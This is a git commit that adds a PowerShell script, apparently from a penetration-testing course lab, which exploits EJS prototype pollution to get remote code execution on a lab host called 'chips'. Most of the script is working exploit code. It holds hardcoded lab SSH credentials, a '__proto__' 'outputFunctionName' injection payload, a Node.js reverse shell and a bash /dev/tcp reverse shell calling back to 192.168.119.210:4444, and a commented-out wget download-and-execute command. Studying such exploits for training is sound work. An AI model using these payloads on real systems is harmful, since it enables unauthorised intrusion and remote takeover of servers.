60f173fe564118dfeae90cd4d2b0bad464b2c018
zinhart <aromzinhartdegraca@gmail.com>
2023-01-17 20:46:48 -0800

    Updates

---
+++ chips/ejs/trigger-ejs-rce.ps1
@@ -0,0 +1,66 @@
+Import-Module Posh-SSH;
+[string]$userName = 'student'
+[string]$userPassword = 'studentlab'
+[string]$machine = 'chips'
+[securestring]$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
+[pscredential]$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)
+
+$worker = New-SSHSession -ComputerName $machine -Credential $credObject
+$worker
+$result = Invoke-SSHCommand -Command 'docker-compose -f /home/student/chips/docker-compose.yml down && export TEMPLATING_ENGINE=ejs && docker-compose -f /home/student/chips/docker-compose.yml up -d' -SSHSession $worker
+$result
+
+Write-Output "Allowing application to start up sleeping for 10 seconds ..."
+Start-Sleep -Seconds 10
+
+$res = iwr -Uri http://chips/ | sls -Pattern '<!-- Using EJS as Templating Engine -->' | % -process {$_.Matches.Value}
+Write-Output "Templating engine: $res"
+# connects but drops
+$shell = @"
+(function(){
+    var net = process.mainModule.require('net'),
+        cp = process.mainModule.require('child_process'),
+        sh = cp.spawn('/bin/bash', []);
+    var client = new net.Socket();
+    client.connect(4444, '192.168.119.210', function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+"@
+# triggers an invalid regular expression flag
+$shell = "/bin/bash -i >& /dev/tcp/192.168.119.210/4444 0>&1"
+$json_obj = @{
+  "connection"= @{
+    "type"="rdp";
+    "settings"= @{
+      "hostname"="rdesktop";
+      "username"="abc";
+      "password"="abc";
+      "port"="3389";
+      "security"="any";
+      "ignore-cert"="true";
+      "client-name"="";
+      "console"="false";
+      "initial-program"="";
+      "__proto__" = @{
+#        "outputFunctionName" = "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); y";
+#"outputFunctionName" = "x=1; process.mainModule.require('child_process').execSync('/usr/bin/wget http://192.168.119.210/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; sh /tmp/shell.sh &'); y"
+          "outputFunctionName" =  "x=1; $shell; y"
+        }
+    }
+  }
+}
+$json = convertto-json $json_obj -depth 4
+$res = Invoke-WebRequest -Uri "http://$machine/token" -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck
+$res_content = ConvertFrom-Json $res.Content
+Write-Output "rdp token: $($res_content.token)
+"
+
+<# possibly use headless chrome here
+$uri = "http://$machine/rdp?token=" + $res_content.token + "&width=1762&height=694"
+$res1 = Invoke-WebRequest -Uri $uri -SkipHttpErrorCheck -Proxy http://192.168.177.1:8080/
+$res1
+#>
